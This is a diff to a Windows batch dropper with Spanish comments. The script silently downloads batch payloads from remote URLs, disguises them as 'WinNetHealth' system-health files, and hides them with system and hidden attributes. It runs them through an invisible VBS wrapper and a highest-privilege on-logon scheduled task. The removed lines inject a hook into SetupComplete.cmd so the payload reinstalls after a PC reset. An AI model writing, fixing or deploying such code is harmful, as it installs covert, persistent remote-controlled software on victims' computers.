@@ -26,30 +26,10 @@ attrib -h -s -r "%DIR_SISTEMA%\runHealth.vbs" >nul 2>&1
 del /f /q "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
 del /f /q "%DIR_AGENTE%\run.vbs" >nul 2>&1
 del /f /q "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1    
-del /f /q "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1  
-
+del /f /q "%DIR_SISTEMA%\runHealth.vbs" >nul 2>&1    
 :: --- 3. DESCARGA DE COMPONENTES ---
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%DIR_AGENTE%\sys_engine.bat')" >nul 2>&1
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_RESTAURADOR%', '%DIR_SISTEMA%\WinNetHealth.bat')" >nul 2>&1
-
-:: --- 4. INYECCIÓN DE SUPERVIVENCIA (SetupComplete.cmd) ---
-:: Esta parte asegura que si resetean la PC, todo se vuelva a descargar solo.
-set "ORDEN_RESTAURADORA=cmd.exe /c %DIR_SISTEMA%\WinNetHealth.bat"
-
-if exist "%TARGET_RESET%" (
-    findstr /C:"%ORDEN_RESTAURADORA%" "%TARGET_RESET%" >nul
-    if !errorlevel! NEQ 0 (
-        attrib -s -h -r "%TARGET_RESET%" >nul 2>&1
-        echo. >> "%TARGET_RESET%"
-        echo :: System Health Recovery Hook >> "%TARGET_RESET%"
-        echo %ORDEN_RESTAURADORA% >> "%TARGET_RESET%"
-    )
-) else (
-    echo @echo off > "%TARGET_RESET%"
-    echo :: Windows Setup Customization >> "%TARGET_RESET%"
-    echo %ORDEN_RESTAURADORA% >> "%TARGET_RESET%"
-)
-attrib +h +s +r "%TARGET_RESET%" >nul 2>&1
 
 :: --- 5. CREACIÓN DEL WRAPPER VBS (Invisible) ---
 echo Set WshShell = CreateObject("WScript.Shell") > "%DIR_AGENTE%\run.vbs"
@@ -65,8 +45,8 @@ echo WshShell.Run "cmd.exe /c %DIR_SISTEMA%\WinNetHealth.bat", 0, False >> "%DIR
 
     :: Tarea 2: El Restaurador (Ejecución al iniciar sesión)
     :: El parámetro /f se encarga de sobreescribir si la tarea ya existe.
-    schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c \"%DIR_SISTEMA%\runHealth.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
-
+    schtasks /create /tn "WinNetHealthCheck" /tr "wscript.exe \"%DIR_SISTEMA%\runHealth.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
+    
 :: --- 7. PROTECCIÓN FINAL Y LIMPIEZA ---
 attrib +h +s +r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
 attrib +h +s +r "%DIR_AGENTE%\run.vbs" >nul 2>&1
